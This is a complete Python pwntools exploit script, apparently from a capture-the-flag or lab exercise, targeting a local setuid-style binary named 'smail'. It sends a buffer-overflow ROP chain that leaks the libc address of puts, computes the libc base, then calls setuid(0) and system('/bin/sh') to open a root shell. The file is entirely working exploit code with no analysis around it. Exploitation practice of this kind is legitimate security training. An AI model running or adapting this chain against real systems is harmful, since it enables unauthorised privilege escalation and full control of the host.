#!/usr/bin/python3

from pwn import *

with open("/home/carlJ/.pwn.conf", "wt") as conf:
    conf.write("[update]\ninterval=never\n")

eip = 72


bin = ELF("./smail")  # load binary for rop 
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  # load libc for ret2libc
proc = process("./smail")  # start the process
context.binary = bin  # set the context to the binary
rop = ROP(bin)  # create the first rop object

rop.call(bin.sym.puts, [bin.got.puts])  # leak the address of libc puts
rop.call(bin.sym.main)  # return to the vuln function


proc.recv() # empty the buffer
proc.sendline(b"2")
proc.recv()
proc.sendline(fit({eip:rop.chain()})) # send rop chain
proc.recvline(False)
puts = u64(proc.recvline(False).ljust(8, b"\x00")) # unpack puts leak
info(f"Leaked puts address: 0x{puts:x}")
proc.recv() # empty the buffer
proc.sendline(b"2")

libc.address = puts - libc.sym.puts  # calculate libc base address
info(f"libc is at: 0x{libc.address:x}")

system = libc.sym.system  # find system offset
info(f"system is at: 0x{system:x}")
bin_sh = next(libc.search(b"/bin/sh"))  # find /bin/sh reference
info(f"/bin/sh is at: 0x{bin_sh:x}")
rop2 = ROP(bin)  # create the second rop object
rop2.call(libc.sym.setuid, [0]) # setuid 0 
rop2.call(system, [bin_sh])  # call system with /bin/sh as parameter


proc.sendline(fit({eip: rop2.chain()})) # send payload 2

proc.interactive() # go go gadget shell
